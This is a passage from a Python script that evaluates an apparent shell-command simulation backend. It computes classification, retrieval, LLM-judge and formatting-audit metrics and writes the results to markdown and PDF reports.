        pass_prompt = check_no_prompt_leakage(response)
        pass_adaptation = check_parameter_adaptation(response, targets)
        
        doc = retrieve_context(cmd)
        ref_output = doc["example_output"] if doc else "No knowledge base document matched. Expected command not found fallback."
        
        judge_res = await call_llm_as_judge(cmd, ref_output, response)
        
        response_evals.append({
            "command": cmd,
            "response": response,
            "latency": latency,
            "audits": {
                "no_markdown_code_blocks": pass_code_blocks,
                "no_conversational_fluff": pass_fluff,
                "no_prompt_leakage": pass_prompt,
                "parameter_adaptation": pass_adaptation
            },
            "judge": judge_res
        })
        
        # Rate limit preservation sleep
        await asyncio.sleep(0.5)
        
    print("\n=== Evaluation Complete! Generating Reports ===")
    
    # Compute aggregate metrics
    avg_latency = sum(r["latency"] for r in response_evals) / len(response_evals) if response_evals else 0
    no_code_blocks_pct = sum(1 for r in response_evals if r["audits"]["no_markdown_code_blocks"]) / len(response_evals) if response_evals else 0
    no_fluff_pct = sum(1 for r in response_evals if r["audits"]["no_conversational_fluff"]) / len(response_evals) if response_evals else 0
    no_prompt_leakage_pct = sum(1 for r in response_evals if r["audits"]["no_prompt_leakage"]) / len(response_evals) if response_evals else 0
    adaptation_pct = sum(1 for r in response_evals if r["audits"]["parameter_adaptation"]) / len(response_evals) if response_evals else 0
    
    avg_realism = sum(r["judge"]["realism"] for r in response_evals) / len(response_evals) if response_evals else 0
    avg_adherence = sum(r["judge"]["adherence"] for r in response_evals) / len(response_evals) if response_evals else 0
    avg_consistency = sum(r["judge"]["consistency"] for r in response_evals) / len(response_evals) if response_evals else 0
    
    # Format markdown report
    markdown_report = f"""# Xynera AI Backend Evaluation Report

This report summarizes the performance evaluation of the Xynera AI Backend across Classification Accuracy, Retrieval Precision, and Response Quality.

- **Timestamp**: {time.strftime("%Y-%m-%d %H:%M:%S")}
- **Total Commands Tested**: {len(TEST_CASES)}
- **Semantic Retrieval Queries Tested**: {len(SEMANTIC_RETRIEVAL_TESTS)}
- **Total Generations Evaluated**: {len(commands_to_generate)}

---

## 📊 Summary of Metrics

| Metric Category | Metric Name | Value | Description |
| :--- | :--- | :--- | :--- |
| **Classification** | Overall Accuracy | `{cls_accuracy:.2%}` | Correct classification of command threat classes |
| **Retrieval** | Overall Accuracy | `{ret_accuracy:.2%}` | Retrieval of correct KB doc or `None` if out-of-scope |
| **Response Quality** | Avg Latency | `{avg_latency:.2f}s` | Time taken to generate simulation output |
| | No Markdown Code Blocks | `{no_code_blocks_pct:.2%}` | % of outputs without forbidden ``` wrapper |
| | No Conversational Fluff | `{no_fluff_pct:.2%}` | % of outputs free of apologies/preambles |
| | No Prompt Leakage | `{no_prompt_leakage_pct:.2%}` | % of outputs without unstripped bash prompts |
| | Parameter Adaptation | `{adaptation_pct:.2%}` | % of outputs successfully substituting command args |
| **LLM-as-a-Judge** | Avg Realism | `{avg_realism:.2f} / 10` | Realism score from Llama-3.1-8b evaluator |
| | Avg Adherence | `{avg_adherence:.2f} / 10` | simulation rules adherence (no meta-text/conversational text) |
| | Avg Consistency | `{avg_consistency:.2f} / 10` | Logical alignment with flags/inputs |

---

## 🔍 Detail: Classification Performance

### Class-Wise Metrics
| Class Name | Precision | Recall | F1-Score |
| :--- | :---: | :---: | :---: |
"""
    
    for cls, metrics in cls_metrics.items():
        markdown_report += f"| {cls} | {metrics['precision']:.2%} | {metrics['recall']:.2%} | {metrics['f1']:.2f} |\n"
        
    markdown_report += """
### Classification Failures & Misclassifications
"""
    if classification_failures:
        markdown_report += "| Command | Expected Class | Actual/Predicted Class |\n| :--- | :--- | :--- |\n"
        for fail in classification_failures:
            markdown_report += f"| `{fail['command']}` | `{fail['expected']}` | `{fail['actual']}` |\n"
    else:
        markdown_report += "*None! The command classifier performed perfectly.*\n"

    markdown_report += """
---

## 🔍 Detail: Retrieval Performance

### Document-Wise/Class-Wise Metrics
| Target KB Command | Precision | Recall | F1-Score |
| :--- | :---: | :---: | :---: |
"""
    for doc, metrics in ret_metrics.items():
        markdown_report += f"| {doc} | {metrics['precision']:.2%} | {metrics['recall']:.2%} | {metrics['f1']:.2f} |\n"

    markdown_report += """
### Retrieval Failures
"""
    if retrieval_failures:
        markdown_report += "| Query / Command | Expected KB Document | Actual Retrieved Document |\n| :--- | :--- | :--- |\n"
        for fail in retrieval_failures:
            markdown_report += f"| `{fail['query']}` | `{fail['expected']}` | `{fail['actual']}` |\n"
    else:
        markdown_report += "*None! The retrieval engine found the correct documents perfectly.*\n"

    markdown_report += """
---

## 🔍 Detail: Response Quality & Simulation Realism

### Sample Generation Log & Scores
| Command | Latency | Code Blocks | No Fluff | No Prompt | Adaptation | Realism | Adherence | Consistency | Judge Feedback |
| :--- | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :--- |
"""
    for r in response_evals:
        audits = r["audits"]
        judge = r["judge"]
        
        cb_status = "✅" if audits["no_markdown_code_blocks"] else "❌"
        fluff_status = "✅" if audits["no_conversational_fluff"] else "❌"
        prompt_status = "✅" if audits["no_prompt_leakage"] else "❌"
        adapt_status = "✅" if audits["parameter_adaptation"] else "❌"
        
        markdown_report += (
            f"| `{r['command']}` | {r['latency']:.2f}s | {cb_status} | {fluff_status} | {prompt_status} | "
            f"{adapt_status} | {judge.get('realism', 1)} | {judge.get('adherence', 1)} | "
            f"{judge.get('consistency', 1)} | {judge.get('reasoning', '')} |\n"
        )
        
    # Write to local markdown file
    with open("evaluation_report.md", "w", encoding="utf-8") as f:
        f.write(markdown_report)
    print("Saved report to: evaluation_report.md")
    
    # Save a copy of markdown to the brain's artifacts directory
    artifact_path = r"C:\Users\VIDIT RATURI\.gemini\antigravity-ide\brain\3610e69d-e473-4826-8c3e-27837a92cb18\evaluation_report.md"
    try:
        with open(artifact_path, "w", encoding="utf-8") as f:
            f.write(markdown_report)
        print(f"Saved copy to artifacts: {artifact_path}")
    except Exception as e:
        print(f"Failed to copy to artifacts path: {e}")

    # Generate PDF report
    print("\nGenerating PDF report...")
    pdf_filename = "evaluation_report.pdf"
    generate_pdf_report(
        cls_accuracy, cls_metrics, classification_failures,
        ret_accuracy, ret_metrics, retrieval_failures,
        response_evals, commands_to_generate,
        avg_latency, no_code_blocks_pct, no_fluff_pct, no_prompt_leakage_pct, adaptation_pct,
        avg_realism, avg_adherence, avg_consistency,
        filename=pdf_filename
    )
    print(f"Saved PDF report to: {pdf_filename}")

    # Copy PDF to artifacts
    pdf_artifact_path = r"C:\Users\VIDIT RATURI\.gemini\antigravity-ide\brain\3610e69d-e473-4826-8c3e-27837a92cb18\evaluation_report.pdf"
    try:
        import shutil
        shutil.copyfile(pdf_filename, pdf_artifact_path)
        print(f"Saved copy of PDF to artifacts: {pdf_artifact_path}")
    except Exception as e:
        print(f"Failed to copy PDF to artifacts path: {e}")

if __name__ == "__main__":
    asyncio.run(run_evaluation())
